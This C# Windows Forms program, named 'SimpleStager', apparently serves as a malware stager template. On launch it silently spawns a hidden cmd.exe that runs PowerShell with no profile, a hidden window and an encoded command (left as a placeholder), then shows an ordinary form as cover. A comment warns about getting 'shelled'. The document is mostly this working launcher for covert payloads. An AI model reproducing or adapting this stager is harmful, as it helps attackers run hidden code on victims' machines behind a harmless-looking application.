using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SimpleStager
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            // DONT TOUCH!!! unless you want to get shelled : (
            //startInfo.Arguments = "/C powershell.exe -nop -w hidden -encodedcommand XXX:";
            startInfo.Arguments = "/C powershell.exe -nop -w hidden -encodedcommand <insert code here!>";
            process.StartInfo = startInfo;
            process.Start();
            System.Media.SystemSounds.Beep.Play();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
